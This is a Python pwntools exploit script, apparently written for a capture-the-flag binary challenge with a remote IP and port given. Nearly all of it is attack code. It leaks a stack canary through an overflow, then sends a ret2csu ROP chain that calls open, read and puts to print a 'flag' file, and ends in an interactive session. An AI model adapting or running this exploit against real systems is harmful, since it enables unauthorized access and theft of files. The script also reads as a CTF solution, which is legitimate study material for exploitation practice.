from pwn import *
from ctypes import *
import os
import roputils as rop
#import roputils as rop

remote_addr = "116.62.152.176"
remote_port = 20001

local_addr = "127.0.0.1"
local_port = 1807

pc = "./pwn"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 1

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc)
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		#gdb.attach(p,'b *0x00000000004009E9\n b*0x0000000000400A6E')
		gdb.attach(p,'b *0x0000000000400C4A\n b *0x0000000000400965')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)

def sl(a):
	p.sendline(a)

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def func3(content):
	sla('option:','3')
	sa('think?)\n',content)

def write_code(code,s):
	sla('option:','2')
	sla('...\n',code)
	sla('y/n\n',s)

def leak_canary(code):
	sla('option:','1')
	sa('play once..\n',code)
	#sleep(1)

def guess_secret(secret):
	sla('option:',str(9011))
	sa('code:',secret)


def hack():
	raw_input()
	init1 = 0x0000000000400C4A
	init2 = 0x0000000000400C30
	code_base = 0x0000000000602080
	flag_path = code_base + 0x200
	write_addr = code_base + 0x300
	puts_got = pwn_elf.got['puts']
	read_got = pwn_elf.got['read']
	open_got = pwn_elf.got['open']
	#vul_func = 0x0000000000400B15

	# symtab = pwn_rop.dynamic('SYMTAB')
	# strtab = pwn_rop.dynamic('STRTAB')
	# syment = pwn_rop.dynamic('SYMENT')
	# rel_plt = pwn_rop.dynamic('JMPREL')
	# rela_ent = pwn_rop.dynamic('RELAENT')
	# plt_got = pwn_rop.dynamic('PLTGOT')

	write_code('a','n')
	for i in range(2):
		sla('...\n','a')
		sla('y/n\n','n')
	sla('...\n','a')
	sla('y/n\n','y')
	
	leak_canary('a'*(0xa9))
	ru('a'*0xa9)
	canary = u64('\x00' + rv(7))
	lg('canary',canary)

	payload = p64(0) + p64(canary) + p64(0) + p64(init1)
	payload += p64(0) + p64(1) + p64(open_got) + p64(0) + p64(0) + p64(flag_path)
	payload += p64(init2) + p64(0)*7
	payload += p64(init1)
	payload += p64(0) + p64(1) + p64(read_got) + p64(0x100) + p64(write_addr) + p64(0) 
	payload += p64(init2) + p64(0)*7
	payload += p64(init1)
	payload += p64(0) + p64(1) + p64(puts_got) + p64(0) + p64(0) + p64(write_addr)
	payload += p64(init2) + p64(0)*7
	payload += p64(0)
	payload = payload.ljust(0x200,'\x00')
	payload += 'flag\0'
	write_code(payload,'y')

	for i in range(1022):
		guess_secret('\x00'*8)
	
	# ru('mouth...\n')
	# puts_addr = u64(rv(6).ljust(8,'\x00'))
	# libc.address = puts_addr - libc.symbols['puts']
	# system_addr = libc.symbols['system']
	# lg('system',system_addr)

	#sa('code:','\x00'*8)

	p.interactive()
hack()